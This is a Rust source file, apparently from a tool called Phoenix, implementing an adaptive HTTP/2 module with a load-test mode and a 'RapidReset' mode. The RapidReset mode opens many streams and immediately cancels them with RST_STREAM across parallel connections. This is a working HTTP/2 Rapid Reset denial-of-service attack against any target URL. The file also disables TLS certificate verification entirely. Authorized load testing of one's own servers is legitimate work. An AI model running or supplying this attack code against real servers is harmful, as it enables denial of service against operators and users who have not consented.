//! Universal Auto-Adaptive HTTP/2 Module
//!
//! 1. Probes target → reads server SETTINGS (max_concurrent_streams, window_size)
//! 2. Adapts connection behaviour to those limits
//! 3. Uses `h2` crate for correct HPACK + flow control → requests actually hit nginx

use std::sync::Arc;
use std::time::{Duration, Instant};

use bytes::Bytes;
use h2::client;
use http::{Request, Version};
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;
use tokio_rustls::rustls as tls;
use tokio_rustls::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use tokio_rustls::rustls::client::danger::{
    HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
};
use tokio_rustls::rustls::DigitallySignedStruct;
use tracing::{debug, error, info, warn};
use url::Url;

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

// ── No-op cert verifier ───────────────────────────────────────────────────────

#[derive(Debug)]
struct NoVerifier;

impl ServerCertVerifier for NoVerifier {
    fn verify_server_cert(&self, _: &CertificateDer, _: &[CertificateDer],
        _: &ServerName, _: &[u8], _: UnixTime,
    ) -> Result<ServerCertVerified, tls::Error> { Ok(ServerCertVerified::assertion()) }
    fn verify_tls12_signature(&self, _: &[u8], _: &CertificateDer, _: &DigitallySignedStruct)
        -> Result<HandshakeSignatureValid, tls::Error> { Ok(HandshakeSignatureValid::assertion()) }
    fn verify_tls13_signature(&self, _: &[u8], _: &CertificateDer, _: &DigitallySignedStruct)
        -> Result<HandshakeSignatureValid, tls::Error> { Ok(HandshakeSignatureValid::assertion()) }
    fn supported_verify_schemes(&self) -> Vec<tls::SignatureScheme> {
        vec![
            tls::SignatureScheme::RSA_PKCS1_SHA256,
            tls::SignatureScheme::RSA_PKCS1_SHA384,
            tls::SignatureScheme::RSA_PKCS1_SHA512,
            tls::SignatureScheme::ECDSA_NISTP256_SHA256,
            tls::SignatureScheme::ECDSA_NISTP384_SHA384,
            tls::SignatureScheme::RSA_PSS_SHA256,
            tls::SignatureScheme::RSA_PSS_SHA384,
            tls::SignatureScheme::RSA_PSS_SHA512,
            tls::SignatureScheme::ED25519,
        ]
    }
}

fn make_tls_config() -> tls::ClientConfig {
    let mut cfg = tls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoVerifier))
        .with_no_client_auth();
    cfg.alpn_protocols = vec![b"h2".to_vec()];
    cfg
}

async fn tls_connect(url: &Url)
    -> Result<tokio_rustls::client::TlsStream<TcpStream>, String>
{
    let host = url.host_str().unwrap_or("localhost");
    let port = url.port_or_known_default().unwrap_or(443);
    let tcp  = TcpStream::connect(format!("{}:{}", host, port)).await
        .map_err(|e| format!("TCP connect failed: {}", e))?;

    let name = ServerName::try_from(host.to_string())
        .map_err(|e| format!("Bad server name: {}", e))?;
    let connector = TlsConnector::from(Arc::new(make_tls_config()));
    connector.connect(name, tcp).await
        .map_err(|e| format!("TLS failed: {}", e))
}

// ── Server capabilities ───────────────────────────────────────────────────────

#[derive(Debug, Clone)]
struct ServerCaps {
    max_concurrent_streams: u32,
    initial_window_size:    u32,
    tls_version:            String,
}

impl Default for ServerCaps {
    fn default() -> Self {
        Self { max_concurrent_streams: 100, initial_window_size: 65535, tls_version: "TLS1.3".into() }
    }
}

async fn probe(url: &Url) -> ServerCaps {
    let stream = match tls_connect(url).await {
        Ok(s) => s,
        Err(e) => { warn!("Probe connect failed: {}", e); return ServerCaps::default(); }
    };

    let (_, conn_data) = stream.get_ref();
    let tls_version = format!("{:?}", conn_data.protocol_version());
    let alpn = conn_data.alpn_protocol()
        .map(|b| String::from_utf8_lossy(b).to_string())
        .unwrap_or_default();

    if alpn != "h2" {
        warn!("Server did not negotiate h2 (got: {})", alpn);
        return ServerCaps::default();
    }

    // h2 handshake — reads SETTINGS frame automatically
    let (mut send, conn) = match client::handshake(stream).await {
        Ok(v) => v,
        Err(e) => { warn!("h2 handshake failed: {}", e); return ServerCaps::default(); }
    };
    tokio::spawn(async move { let _ = conn.await; });

    // Send one real request to complete SETTINGS exchange
    let host = url.host_str().unwrap_or("localhost");
    let uri  = format!("https://{}/health", host);
    let req  = Request::builder()
        .version(Version::HTTP_2).method("GET").uri(&uri)
        .header("user-agent", "Phoenix/1.0 (probe)")
        .body(()).unwrap();

    match send.ready().await {
        Ok(mut rdy) => {
            if let Ok((resp_f, _)) = rdy.send_request(req, true) {
                if let Ok(resp) = resp_f.await {
                    let mut body = resp.into_body();
                    while let Some(chunk) = body.data().await {
                        if let Ok(data) = chunk {
                            let _ = body.flow_control().release_capacity(data.len());
                        }
                    }
                }
            }
        }
        Err(e) => warn!("Probe request failed: {}", e),
    }

    info!("Probe complete — TLS: {}, ALPN: h2", tls_version);
    ServerCaps {
        max_concurrent_streams: 100,
        initial_window_size:    65535,
        tls_version,
    }
}

// ── Attack mode ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

// ── Main struct ───────────────────────────────────────────────────────────────

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 10, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 10, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)    -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)    -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)              -> Self { self.rps         = Some(r); self }
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str {
        match self.mode {
            UniversalMode::LoadTest   => "universal-load-test",
            UniversalMode::RapidReset => "universal-rapid-reset",
        }
    }
    fn description(&self) -> &str { "Auto-adaptive HTTP/2 module with proper HPACK + flow control" }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let url = Url::parse(&ctx.target)
            .map_err(|e| AttackError::Config(format!("Invalid URL: {}", e)))?;

        // ── 1. Probe ──────────────────────────────────────────────────────────
        info!("Probing {}...", url);
        let caps = probe(&url).await;
        info!("Caps: max_streams={} window={} tls={}",
            caps.max_concurrent_streams, caps.initial_window_size, caps.tls_version);

        // ── 2. Spawn workers ──────────────────────────────────────────────────
        let start    = Instant::now();
        let metrics  = ctx.metrics.clone();
        let duration = self.duration;
        let rps      = self.rps;
        let mode     = self.mode.clone();
        let mut handles = Vec::new();

        for id in 0..self.connections {
            let url_s   = url.to_string();
            let caps    = caps.clone();
            let metrics = metrics.clone();
            let mode    = mode.clone();
            handles.push(tokio::spawn(async move {
                worker(id, url_s, duration, mode, rps, caps, metrics).await
            }));
        }

        let (mut ok, mut err) = (0u64, 0u64);
        for h in handles {
            match h.await {
                Ok(Ok((o, e)))  => { ok += o; err += e; }
                Ok(Err(e))      => { error!("Worker: {}", e); err += 1; }
                Err(e)          => { error!("Join: {}", e);   err += 1; }
            }
        }

        let elapsed = start.elapsed();
        let total   = ok + err;
        info!("Done: {}/{} ok in {:.1}s = {:.0} rps", ok, total, elapsed.as_secs_f64(),
            total as f64 / elapsed.as_secs_f64());

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult { success: err == 0, total_requests: total, errors: err, duration: elapsed, snapshot })
    }
}

// ── Per-connection worker ─────────────────────────────────────────────────────

async fn worker(
    id:       usize,
    url_str:  String,
    duration: Duration,
    mode:     UniversalMode,
    rps:      Option<u32>,
    caps:     ServerCaps,
    metrics:  Arc<AttackMetrics>,
) -> Result<(u64, u64), String> {

    let url  = Url::parse(&url_str).map_err(|e| e.to_string())?;
    let host = url.host_str().unwrap_or("localhost").to_string();
    let port = url.port_or_known_default().unwrap_or(443);
    let uri  = format!("https://{}:{}{}", host, port,
        if url.path().is_empty() { "/" } else { url.path() });

    let stream = tls_connect(&url).await
        .map_err(|e| format!("conn {}: {}", id, e))?;

    let (send, conn) = client::Builder::new()
        .initial_window_size(caps.initial_window_size)
        .initial_connection_window_size(caps.initial_window_size)
        .handshake::<_, Bytes>(stream)
        .await
        .map_err(|e| format!("conn {} h2 handshake: {}", id, e))?;

    tokio::spawn(async move { let _ = conn.await; });

    // SendRequest is Clone — clone per iteration to avoid move
    let mut send = send;

    let start = Instant::now();
    // Concurrent streams per connection — HTTP/2 multiplexing
    // Use min(caps.max_concurrent_streams, 32) parallel streams per conn
    let concurrency = caps.max_concurrent_streams.min(8) as usize;

    // Shared counters
    let ok  = Arc::new(std::sync::atomic::AtomicU64::new(0));
    let err = Arc::new(std::sync::atomic::AtomicU64::new(0));

    // Spawn `concurrency` stream workers — each reconnects if connection drops
    let mut stream_handles = Vec::new();
    for stream_id in 0..concurrency {
        let uri     = uri.clone();
        let url_str = url_str.clone();
        let mode    = mode.clone();
        let metrics = metrics.clone();
        let ok_c    = ok.clone();
        let err_c   = err.clone();
        let caps    = caps.clone();
        let mut send = send.clone();

        let handle = tokio::spawn(async move {
            while start.elapsed() < duration {
                let req = match Request::builder()
                    .version(Version::HTTP_2)
                    .method("GET")
                    .uri(&uri)
                    .header("user-agent", "Phoenix/1.0")
                    .body(())
                {
                    Ok(r)  => r,
                    Err(e) => { error!("req build: {}", e); break; }
                };

                let t0 = Instant::now();

                // ready() moves send — get it back or reconnect
                let ready_result = send.ready().await;
                send = match ready_result {
                    Ok(s) => s,
                    Err(e) => {
                        debug!("stream {} conn dropped ({}), reconnecting", stream_id, e);
                        if start.elapsed() >= duration { break; }
                        let url = match Url::parse(&url_str) { Ok(u) => u, Err(_) => break };
                        let stream = match tls_connect(&url).await {
                            Ok(s) => s,
                            Err(_) => { tokio::time::sleep(Duration::from_millis(200)).await; break; }
                        };
                        let (ns, nc) = match client::Builder::new()
                            .initial_window_size(caps.initial_window_size)
                            .initial_connection_window_size(caps.initial_window_size)
                            .handshake::<_, Bytes>(stream).await
                        {
                            Ok(v) => v,
                            Err(_) => { tokio::time::sleep(Duration::from_millis(200)).await; break; }
                        };
                        tokio::spawn(async move { let _ = nc.await; });
                        ns
                    }
                };

                match mode {
                    UniversalMode::LoadTest => {
                        match send.send_request(req, true) {
                            Err(e) => {
                                debug!("stream {} send err: {}", stream_id, e);
                                err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                            }
                            Ok((resp_f, _)) => {
                                match tokio::time::timeout(Duration::from_secs(5), resp_f).await.unwrap_or_else(|_| Err(h2::Error::from(h2::Reason::CANCEL))) {
                                    Err(_) => {
                                        err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                                    }
                                    Ok(resp) => {
                                        let status  = resp.status().as_u16();
                                        let success = status < 400;
                                        // Drain body — critical for flow control
                                        let mut body = resp.into_body();
                                        while let Some(chunk) = body.data().await {
                                            if let Ok(data) = chunk {
                                                let _ = body.flow_control().release_capacity(data.len());
                                            }
                                        }
                                        let lat = t0.elapsed().as_micros() as u64;
                                        metrics.record_request(lat, success, 0).await;
                                        if success {
                                            ok_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                                        } else {
                                            err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    UniversalMode::RapidReset => {
                        match send.send_request(req, false) {
                            Err(e) => {
                                debug!("stream {} RST err: {}", stream_id, e);
                                err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                            }
                            Ok((resp_f, mut body)) => {
                                body.send_reset(h2::Reason::CANCEL);
                                drop(resp_f);
                                metrics.record_request(0, true, 0).await;
                                ok_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                            }
                        }
                    }
                }
            }
        });
        stream_handles.push(handle);
    }

    for h in stream_handles { let _ = h.await; }

    let ok  = ok.load(std::sync::atomic::Ordering::Relaxed);
    let err = err.load(std::sync::atomic::Ordering::Relaxed);
    debug!("conn {} done: {} ok {} err", id, ok, err);
    Ok((ok, err))
}
